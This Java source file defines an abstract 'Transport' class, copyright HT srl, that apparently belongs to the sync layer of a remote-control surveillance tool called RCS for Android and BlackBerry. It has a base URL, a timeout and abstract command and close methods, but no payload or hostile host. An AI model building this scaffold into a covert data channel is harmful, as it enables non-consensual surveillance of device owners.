package com.ht.RCSAndroidGUI.action.sync;

import com.ht.RCSAndroidGUI.Debug;


/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

public abstract class Transport {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Transport");
    //#endif

    protected final int timeout = 3 * 60 * 1000;

    protected String baseurl;
    protected String suffix;

    public Transport(String baseurl) {
        //this.host = host;
        //this.port = port;
        this.baseurl = baseurl;
    }

    public String toString() {
        return "Transport " + getUrl();
    }

    public abstract boolean isAvailable();

    public abstract byte[] command(byte[] data) throws TransportException;

    //public abstract void initConnectionUrl();
    protected abstract String getSuffix();

    public abstract void close();

    public String getUrl() {
        return baseurl ;
    }

}
